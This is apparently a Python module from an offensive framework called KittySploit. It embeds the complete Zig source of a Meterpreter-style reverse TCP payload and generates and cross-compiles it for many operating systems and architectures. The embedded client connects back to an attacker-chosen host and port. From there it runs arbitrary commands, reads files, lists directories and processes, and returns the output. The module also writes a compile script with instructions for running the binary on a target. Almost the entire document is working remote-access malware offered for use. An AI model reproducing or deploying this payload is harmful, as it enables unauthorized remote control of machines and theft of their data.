#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Zig Meterpreter Reverse TCP Payload
Author: KittySploit Team
Version: 1.0.0

This payload generates a Zig-based Meterpreter client that can be compiled
cross-platform. Zig allows easy cross-compilation for multiple architectures
and operating systems.

REQUIREMENT: Zig compiler must be installed on the attacker machine
The compiled binary can run on the target without any dependencies!
"""

from kittysploit import *
import os
import subprocess
from pathlib import Path

class Module(Payload):
    __info__ = {
        'name': 'Zig Meterpreter, Reverse TCP',
        'description': 'Meterpreter payload in Zig - cross-platform compilation (requires Zig compiler)',
        'author': 'KittySploit Team',
        'version': '1.0.0',
        'category': 'singles',
        'platform': Platform.UNIX,
        'arch': Arch.X64,  # Zig supports multiple architectures
        'listener': 'listeners/multi/meterpreter',
        'handler': Handler.REVERSE,
        'session_type': SessionType.METERPRETER,
        'references': [
            'https://ziglang.org/',
            'https://ziglang.org/documentation/master/#Cross-compilation-is-a-first-class-use-case'
        ]
    }
    
    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    lport = OptPort(4444, 'Connect to port', True)
    target_os = OptChoice('linux', 'Target operating system', True, 
                         ['linux', 'windows', 'macos', 'freebsd', 'netbsd', 'openbsd', 'dragonfly'])
    target_arch = OptChoice('x86_64', 'Target architecture', True,
                            ['x86_64', 'x86', 'aarch64', 'arm', 'mips', 'mips64', 'riscv64', 'wasm32'])
    optimization = OptChoice('ReleaseSmall', 'Optimization level', False,
                           ['Debug', 'ReleaseFast', 'ReleaseSafe', 'ReleaseSmall'])
    auto_compile = OptBool(False, 'Automatically compile after generation', False)
    output_dir = OptString('output', 'Output directory for compiled binaries', False)
    
    # Zig source code embedded in the module
    ZIG_SOURCE_CODE = """
const std = @import("std");
const json = std.json;
const os = std.os;
const posix = std.posix;
const process = std.process;
const mem = std.mem;
const fmt = std.fmt;
const builtin = @import("builtin");

const SOCKADDR_IN = extern struct {
    family: u16,
    port: u16,
    addr: u32,
    zero: [8]u8,
};

const MeterpreterClient = struct {
    host: []const u8,
    port: u16,
    socket_fd: ?usize = null,
    current_dir: []const u8,
    is_root: bool,
    username: []const u8,
    hostname: []const u8,
    allocator: std.mem.Allocator,

    const Self = @This();

    pub fn init(allocator: std.mem.Allocator, host: []const u8, port: u16) !Self {
        var self = Self{
            .host = host,
            .port = port,
            .current_dir = try process.getCwdAlloc(allocator),
            .is_root = false,
            .username = "user",
            .hostname = "localhost",
            .allocator = allocator,
        };

        if (builtin.target.os.tag == .linux or builtin.target.os.tag == .macos) {
            self.is_root = (posix.getuid() == 0);
        }

        if (builtin.target.os.tag == .windows) {
            if (process.getEnvVarOwned(allocator, "USERNAME")) |username| {
                defer allocator.free(username);
                self.username = try allocator.dupe(u8, username);
            } else |_| {}
            if (process.getEnvVarOwned(allocator, "COMPUTERNAME")) |hostname| {
                defer allocator.free(hostname);
                self.hostname = try allocator.dupe(u8, hostname);
            } else |_| {}
        } else {
            if (posix.getenv("USER")) |user| {
                self.username = try allocator.dupe(u8, user);
            }
            if (posix.getenv("HOSTNAME")) |hostname| {
                self.hostname = try allocator.dupe(u8, hostname);
            }
        }

        return self;
    }

    pub fn connect(self: *Self) !void {
        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            
            var wsa_data: ws2_32.WSADATA = undefined;
            if (ws2_32.WSAStartup(0x0202, &wsa_data) != 0) {
                return error.ConnectionFailed;
            }
            
            const sock = ws2_32.socket(2, 1, 0);
            if (sock == ws2_32.INVALID_SOCKET) return error.ConnectionFailed;
            
            var host_buf: [256]u8 = undefined;
            if (self.host.len >= host_buf.len) return error.InvalidAddress;
            @memcpy(host_buf[0..self.host.len], self.host);
            host_buf[self.host.len] = 0;
            
            var addr: SOCKADDR_IN = .{
                .family = 2,
                .port = ws2_32.htons(self.port),
                .addr = ws2_32.inet_addr(&host_buf),
                .zero = [_]u8{0} ** 8,
            };
            
            if (ws2_32.connect(
                sock,
                @ptrCast(&addr),
                @sizeOf(SOCKADDR_IN),
            ) != 0) {
                return error.ConnectionFailed;
            }
            
            self.socket_fd = @intFromPtr(sock);
        } else {
            const sock = try posix.socket(posix.AF.INET, posix.SOCK.STREAM | posix.SOCK.CLOEXEC, 0);
            errdefer posix.close(sock);
            
            var addr: posix.sockaddr.in = undefined;
            addr.family = posix.AF.INET;
            addr.port = @byteSwap(self.port);
            
            var ip_parts: [4]u8 = undefined;
            var part_idx: usize = 0;
            var current: u32 = 0;
            for (self.host) |c| {
                if (c == '.') {
                    if (part_idx >= 4) return error.InvalidAddress;
                    ip_parts[part_idx] = @intCast(current);
                    part_idx += 1;
                    current = 0;
                } else if (c >= '0' and c <= '9') {
                    current = current * 10 + (c - '0');
                } else {
                    return error.InvalidAddress;
                }
            }
            if (part_idx != 3) return error.InvalidAddress;
            ip_parts[3] = @intCast(current);
            
            const ip_addr: u32 = (@as(u32, ip_parts[0]) << 24) | 
                                 (@as(u32, ip_parts[1]) << 16) | 
                                 (@as(u32, ip_parts[2]) << 8) | 
                                 @as(u32, ip_parts[3]);
            addr.addr = @byteSwap(ip_addr);
            
            try posix.connect(sock, @ptrCast(&addr), @sizeOf(posix.sockaddr.in));
            self.socket_fd = @intCast(sock);
        }
    }

    pub fn sendResponse(self: *Self, output: []const u8, status: i32, error_msg: []const u8) !void {
        if (self.socket_fd == null) return;

        const response_bytes = try json.Stringify.valueAlloc(self.allocator, .{
            .output = output,
            .status = status,
            .error_msg = error_msg,
        }, .{});
        defer self.allocator.free(response_bytes);
        const length: u32 = @intCast(response_bytes.len);

        const length_bytes = mem.asBytes(&length);
        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            const sock = @as(ws2_32.SOCKET, @ptrFromInt(self.socket_fd.?));
            const sent1 = ws2_32.send(sock, length_bytes.ptr, @intCast(length_bytes.len), 0);
            if (sent1 == ws2_32.SOCKET_ERROR) return error.ConnectionFailed;
            const sent2 = ws2_32.send(sock, response_bytes.ptr, @intCast(response_bytes.len), 0);
            if (sent2 == ws2_32.SOCKET_ERROR) return error.ConnectionFailed;
        } else {
            const fd = @as(posix.fd_t, @intCast(self.socket_fd.?));
            _ = try posix.send(fd, length_bytes, 0);
            _ = try posix.send(fd, response_bytes, 0);
        }
    }

    pub fn receiveCommand(self: *Self) !?Command {
        if (self.socket_fd == null) return null;

        var length_bytes: [4]u8 = undefined;
        var bytes_read: usize = 0;
        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            const sock = @as(ws2_32.SOCKET, @ptrFromInt(self.socket_fd.?));
            while (bytes_read < 4) {
                const n = ws2_32.recv(sock, length_bytes[bytes_read..].ptr, @intCast(4 - bytes_read), 0);
                if (n == ws2_32.SOCKET_ERROR) return error.ConnectionFailed;
                if (n == 0) return null;
                bytes_read += @intCast(n);
            }
        } else {
            const fd = @as(posix.fd_t, @intCast(self.socket_fd.?));
            while (bytes_read < 4) {
                const n = try posix.recv(fd, length_bytes[bytes_read..], 0);
                if (n == 0) return null;
                bytes_read += n;
            }
        }
        const length = mem.readInt(u32, &length_bytes, .big);

        var command_data = try self.allocator.alloc(u8, length);
        defer self.allocator.free(command_data);
        bytes_read = 0;
        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            const sock = @as(ws2_32.SOCKET, @ptrFromInt(self.socket_fd.?));
            while (bytes_read < length) {
                const n = ws2_32.recv(sock, command_data[bytes_read..].ptr, @intCast(length - bytes_read), 0);
                if (n == ws2_32.SOCKET_ERROR) return error.ConnectionFailed;
                if (n == 0) return null;
                bytes_read += @intCast(n);
            }
        } else {
            const fd = @as(posix.fd_t, @intCast(self.socket_fd.?));
            while (bytes_read < length) {
                const n = try posix.recv(fd, command_data[bytes_read..], 0);
                if (n == 0) return null;
                bytes_read += n;
            }
        }

        var parsed = try json.parseFromSlice(Command, self.allocator, command_data, .{});

        return parsed.value;
    }

    pub fn executeCommand(self: *Self, cmd: []const u8, args: []const []const u8) !CommandResult {
        if (mem.eql(u8, cmd, "sysinfo")) {
            return self.cmdSysinfo();
        } else if (mem.eql(u8, cmd, "getuid")) {
            return self.cmdGetuid();
        } else if (mem.eql(u8, cmd, "getpid")) {
            return self.cmdGetpid();
        } else if (mem.eql(u8, cmd, "pwd")) {
            return self.cmdPwd();
        } else if (mem.eql(u8, cmd, "cd")) {
            return self.cmdCd(args);
        } else if (mem.eql(u8, cmd, "ls")) {
            return self.cmdLs(args);
        } else if (mem.eql(u8, cmd, "cat")) {
            return self.cmdCat(args);
        } else if (mem.eql(u8, cmd, "execute")) {
            return self.cmdExecute(args);
        } else if (mem.eql(u8, cmd, "ps")) {
            return self.cmdPs();
        } else {
            return self.cmdExecute(args);
        }
    }

    fn cmdSysinfo(self: *Self) !CommandResult {
        var output = std.array_list.Managed(u8).init(self.allocator);
        defer output.deinit();

        try output.print("Computer\\t\\t: {s}\\n", .{self.hostname});
        try output.print("OS\\t\\t\\t: {s}\\n", .{@tagName(builtin.target.os.tag)});
        try output.print("Architecture\\t\\t: {s}\\n", .{@tagName(builtin.target.cpu.arch)});
        try output.print("Meterpreter\\t\\t: Zig\\n", .{});
        try output.print("Zig Version\\t\\t: {s}\\n", .{"0.12.0"});

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdGetuid(self: *Self) !CommandResult {
        var output = std.array_list.Managed(u8).init(self.allocator);
        defer output.deinit();

        const uid: u32 = if (builtin.target.os.tag == .linux or builtin.target.os.tag == .macos) 
            posix.getuid() 
        else 
            1000;
        try output.print("Server username: {s} ({d})\\n", .{ self.username, uid });

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdGetpid(self: *Self) !CommandResult {
        var output = std.array_list.Managed(u8).init(self.allocator);
        defer output.deinit();

        const pid: i32 = if (builtin.target.os.tag == .windows) 
            @intCast(os.windows.GetCurrentProcessId())
        else if (builtin.target.os.tag == .linux)
            @intCast(os.linux.getpid())
        else
            @intCast(os.linux.getpid());
        try output.print("Current pid: {d}\\n", .{pid});

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdPwd(self: *Self) !CommandResult {
        var output = std.array_list.Managed(u8).init(self.allocator);
        defer output.deinit();

        try output.print("{s}\\n", .{self.current_dir});

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdCd(self: *Self, args: []const []const u8) !CommandResult {
        var target_dir: []const u8 = undefined;
        var target_dir_owned: ?[]u8 = null;
        defer if (target_dir_owned) |td| self.allocator.free(td);
        
        if (args.len == 0) {
            if (builtin.target.os.tag == .windows) {
                if (process.getEnvVarOwned(self.allocator, "USERPROFILE")) |home| {
                    defer self.allocator.free(home);
                    target_dir_owned = try self.allocator.dupe(u8, home);
                    target_dir = target_dir_owned.?;
                } else |_| {
                    target_dir_owned = try self.allocator.dupe(u8, "C:\\\\Users\\\\user");
                    target_dir = target_dir_owned.?;
                }
            } else {
                if (posix.getenv("HOME")) |home| {
                    target_dir_owned = try self.allocator.dupe(u8, home);
                    target_dir = target_dir_owned.?;
                } else {
                    target_dir_owned = try self.allocator.dupe(u8, "/home/user");
                    target_dir = target_dir_owned.?;
                }
            }
        } else {
            target_dir = args[0];
        }

        const full_path = if (mem.startsWith(u8, target_dir, "/"))
            try self.allocator.dupe(u8, target_dir)
        else
            try std.fmt.allocPrint(self.allocator, "{s}/{s}", .{ self.current_dir, target_dir });
        defer self.allocator.free(full_path);

        var dir = std.fs.cwd().openDir(full_path, .{}) catch {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "cd: {s}: No such file or directory", .{full_path}),
            };
        };
        dir.close();

        self.allocator.free(self.current_dir);
        self.current_dir = try self.allocator.dupe(u8, full_path);
        return CommandResult{
            .output = "",
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdLs(self: *Self, args: []const []const u8) !CommandResult {
        const target_dir_raw = if (args.len == 0) self.current_dir else args[0];
        const target_dir = if (mem.startsWith(u8, target_dir_raw, "/"))
            target_dir_raw
        else
            try std.fmt.allocPrint(self.allocator, "{s}/{s}", .{ self.current_dir, target_dir_raw });

        var dir = std.fs.cwd().openDir(target_dir, .{}) catch {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "ls: {s}: No such file or directory", .{target_dir}),
            };
        };
        defer dir.close();

        var output = std.array_list.Managed(u8).init(self.allocator);
        defer output.deinit();

        var iter = dir.iterate();
        while (try iter.next()) |entry| {
            const name = entry.name;
            if (entry.kind == .directory) {
                try output.print("{s}/\\n", .{name});
            } else {
                const file = try dir.openFile(name, .{});
                defer file.close();
                const stat = try file.stat();
                try output.print("{s} ({d} bytes)\\n", .{ name, stat.size });
            }
        }

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdCat(self: *Self, args: []const []const u8) !CommandResult {
        if (args.len == 0) {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = "Usage: cat <file>",
            };
        }

        const file_path = if (mem.startsWith(u8, args[0], "/"))
            args[0]
        else
            try std.fmt.allocPrint(self.allocator, "{s}/{s}", .{ self.current_dir, args[0] });

        const content = std.fs.cwd().readFileAlloc(file_path, self.allocator, .unlimited) catch {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "cat: {s}: No such file", .{file_path}),
            };
        };

        return CommandResult{
            .output = content,
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdExecute(self: *Self, args: []const []const u8) !CommandResult {
        if (args.len == 0) {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = "Usage: execute <command>",
            };
        }

        var cmd_args = std.array_list.Managed([]const u8).init(self.allocator);
        defer cmd_args.deinit();

        var it = mem.splitScalar(u8, args[0], ' ');
        while (it.next()) |arg| {
            if (arg.len > 0) {
                try cmd_args.append(arg);
            }
        }
        
        var child = std.process.Child.init(cmd_args.items, self.allocator);
        child.cwd = self.current_dir;
        child.stdin_behavior = .Ignore;
        child.stdout_behavior = .Pipe;
        child.stderr_behavior = .Pipe;
        child.spawn() catch |err| {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "execute error: {s}", .{@errorName(err)}),
            };
        };
        var stdout_list = std.ArrayList(u8).empty;
        var stderr_list = std.ArrayList(u8).empty;
        
        child.collectOutput(self.allocator, &stdout_list, &stderr_list, 1024 * 1024) catch |err| {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "execute error: {s}", .{@errorName(err)}),
            };
        };
        
        const result = child.wait() catch |err| {
            stdout_list.deinit(self.allocator);
            stderr_list.deinit(self.allocator);
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "execute error: {s}", .{@errorName(err)}),
            };
        };
        
        const exit_code: i32 = switch (result) {
            .Exited => |code| @intCast(code),
            else => 1,
        };
        
        const stdout = try self.allocator.dupe(u8, stdout_list.items);
        const stderr = try self.allocator.dupe(u8, stderr_list.items);
        stdout_list.deinit(self.allocator);
        stderr_list.deinit(self.allocator);
        
        return CommandResult{
            .output = stdout,
            .status = exit_code,
            .error_msg = stderr,
        };
    }

    fn cmdPs(self: *Self) !CommandResult {
        var child = std.process.Child.init(&[_][]const u8{ "ps", "aux" }, self.allocator);
        child.stdin_behavior = .Ignore;
        child.stdout_behavior = .Pipe;
        child.stderr_behavior = .Pipe;
        child.spawn() catch |err| {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "ps error: {s}", .{@errorName(err)}),
            };
        };
        var stdout_list = std.ArrayList(u8).empty;
        var stderr_list = std.ArrayList(u8).empty;
        
        child.collectOutput(self.allocator, &stdout_list, &stderr_list, 1024 * 1024) catch |err| {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "ps error: {s}", .{@errorName(err)}),
            };
        };
        
        const result = child.wait() catch |err| {
            stdout_list.deinit(self.allocator);
            stderr_list.deinit(self.allocator);
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "ps error: {s}", .{@errorName(err)}),
            };
        };
        
        const exit_code: i32 = switch (result) {
            .Exited => |code| @intCast(code),
            else => 1,
        };
        
        const stdout = try self.allocator.dupe(u8, stdout_list.items);
        const stderr = try self.allocator.dupe(u8, stderr_list.items);
        stdout_list.deinit(self.allocator);
        stderr_list.deinit(self.allocator);

        return CommandResult{
            .output = stdout,
            .status = exit_code,
            .error_msg = stderr,
        };
    }

    pub fn run(self: *Self) !void {
        try self.connect();

        while (true) {
            const command = try self.receiveCommand() orelse break;

            if (mem.eql(u8, command.command, "exit")) {
                break;
            }

            const result = try self.executeCommand(command.command, command.args);
            try self.sendResponse(result.output, result.status, result.error_msg);
        }

        if (self.socket_fd) |fd_val| {
            if (builtin.target.os.tag == .windows) {
                const ws2_32 = os.windows.ws2_32;
                const sock = @as(ws2_32.SOCKET, @ptrFromInt(fd_val));
                _ = ws2_32.closesocket(sock);
            } else {
                const sock = @as(posix.fd_t, @intCast(fd_val));
                posix.close(sock);
            }
        }
    }
};

const Command = struct {
    command: []const u8,
    args: []const []const u8,
};

const CommandResult = struct {
    output: []const u8,
    status: i32,
    error_msg: []const u8,
};

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{.safety = false}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try process.argsAlloc(allocator);
    defer process.argsFree(allocator, args);

    const host = if (args.len > 1) args[1] else "127.0.0.1";
    const port = if (args.len > 2) try fmt.parseInt(u16, args[2], 10) else 4444;

    var client = try MeterpreterClient.init(allocator, host, port);
    try client.run();
}
"""
    
    def generate(self):
        """Generate the Zig Meterpreter payload"""
        try:
            print_info("Generating Zig Meterpreter payload...")
            print_info(f"Target: {self.target_os}-{self.target_arch}")
            print_info(f"Connect to: {self.lhost}:{self.lport}")
            
            # Use embedded Zig source code
            zig_source = self.ZIG_SOURCE_CODE
            
            # Determine output directory - use output/ like other framework outputs
            platform_dir = self._get_platform_dir(self.target_os)
            
            # Use output directory with platform/arch structure
            if self.output_dir:
                output_path = Path(self.output_dir)
            else:
                # Default: output/zig_meterpreter/<platform>/<arch>/
                output_path = Path("output") / "zig_meterpreter" / platform_dir / self.target_arch
            
            output_path.mkdir(parents=True, exist_ok=True)
            print_info(f"Binary output directory: {output_path}")
            
            # Save source file in src subdirectory (for compilation reference)
            src_dir = output_path / "src"
            src_dir.mkdir(parents=True, exist_ok=True)
            output_source = src_dir / "meterpreter.zig"
            with open(output_source, 'w', encoding='utf-8') as f:
                f.write(zig_source)
            
            print_info(f"Source code saved to: {output_source}")
            
            # Determine binary name and path
            binary_name = self._get_binary_name(self.target_os)
            binary_path = output_path / binary_name
            
            # Generate compilation instructions
            compile_instructions = self._generate_compile_instructions(str(output_source), str(binary_path))
            
            # Save compilation script
            compile_script = output_path / "compile.sh"
            with open(compile_script, 'w', encoding='utf-8') as f:
                f.write(compile_instructions)
            
            # Make script executable (Unix)
            if os.name != 'nt':
                os.chmod(compile_script, 0o755)
            
            print_success(f"Compilation script saved to: {compile_script}")
            print_info(f"Binary will be saved to: {binary_path}")
            
            # Auto-compile if requested
            if self.auto_compile:
                print_info("Auto-compiling...")
                if self._compile():
                    print_success("Compilation successful!")
                else:
                    print_warning("Compilation failed, but source files are ready")
            
            return True

        except Exception as e:
            print_error(f"Error generating Zig payload: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def _get_platform_dir(self, target_os: str) -> str:
        """Get platform directory name"""
        platform_map = {
            'linux': 'linux',
            'windows': 'windows',
            'macos': 'mac',
            'freebsd': 'freebsd',
            'netbsd': 'netbsd',
            'openbsd': 'openbsd',
            'dragonfly': 'dragonfly'
        }
        return platform_map.get(target_os.lower(), target_os.lower())
    
    def _get_binary_name(self, target_os: str) -> str:
        """Get binary name based on OS"""
        if target_os.lower() == 'windows':
            return 'meterpreter.exe'
        else:
            return 'meterpreter'
    
    def _generate_compile_instructions(self, source_path: str, binary_path: str) -> str:
        """Generate compilation instructions"""
        target = f"{self.target_os}-{self.target_arch}"
        opt_flag = f"-O{self.optimization}"
        binary_name = os.path.basename(binary_path)
        source_name = os.path.basename(source_path)
        source_dir = os.path.dirname(source_path)
        
        instructions = f"""#!/bin/bash
# Zig Meterpreter Compilation Script
# Target: {target}
# Optimization: {self.optimization}
# Binary: {binary_path}

echo "Compiling Zig Meterpreter for {target}..."
echo "Source: {source_path}"
echo "Output: {binary_path}"

# Check if Zig is installed
if ! command -v zig &> /dev/null; then
    echo "Error: Zig compiler not found!"
    echo "Install Zig from: https://ziglang.org/download/"
    exit 1
fi

# Compile (Zig doesn't support --output-dir, so we compile then move)
cd "{source_dir}"
binary_name_no_ext=$(basename "{binary_name}" .exe)
zig build-exe {source_name} \\
    -target {target} \\
    {opt_flag} \\
    -fstrip \\
    --name "$binary_name_no_ext"

if [ $? -eq 0 ]; then
    # Find and move the compiled binary
    # Zig may add .exe extension on Windows
    compiled_binary=""
    for name in "{binary_name}" "$binary_name_no_ext" "$binary_name_no_ext.exe"; do
        if [ -f "$name" ]; then
            compiled_binary="$name"
            break
        fi
    done
    
    if [ -n "$compiled_binary" ]; then
        mv "$compiled_binary" "{binary_path}"
        echo "✓ Compilation successful!"
        echo "Binary: {binary_path}"
        echo ""
        echo "To run on target:"
        if [[ "{self.target_os}" == "windows" ]]; then
            echo "  {binary_name} {self.lhost} {self.lport}"
        else
            echo "  chmod +x {binary_name}"
            echo "  ./{binary_name} {self.lhost} {self.lport}"
        fi
    else
        echo "✗ Compiled binary not found!"
        exit 1
    fi
else
    echo "✗ Compilation failed!"
    exit 1
fi
"""
        return instructions
    
    def _compile(self) -> bool:
        """Compile the Zig payload using the framework's compilation function"""
        try:
            # Determine output directory (same logic as generate)
            platform_dir = self._get_platform_dir(self.target_os)
            if self.output_dir:
                output_path = Path(self.output_dir)
            else:
                output_path = Path("output") / "zig_meterpreter" / platform_dir / self.target_arch
                output_path.mkdir(parents=True, exist_ok=True)
            
            binary_name = self._get_binary_name(self.target_os)
            binary_path = output_path / binary_name
            
            # Read source code (already saved in src/)
            source_file = output_path / "src" / "meterpreter.zig"
            if not source_file.exists():
                print_error(f"Source file not found: {source_file}")
                return False
            
            with open(source_file, 'r', encoding='utf-8') as f:
                zig_source = f.read()
            
            # Use the framework's compile_zig function from BaseModule/Payload
            print_info(f"Compiling Zig Meterpreter for {self.target_os}-{self.target_arch}...")
            
            success = self.compile_zig(
                source_code=zig_source,
                output_path=str(binary_path),
                target_platform=self.target_os,
                target_arch=self.target_arch,
                optimization=self.optimization,
                strip=True,
                static=True
            )
            
            if success and binary_path.exists():
                size = binary_path.stat().st_size
                print_info(f"Binary size: {size} bytes")
                return True
            
            return False
                
        except Exception as e:
            print_error(f"Compilation error: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    
    def run(self):
        """Run the payload generation"""
        result = self.generate()
        if result:
            return True
        return False

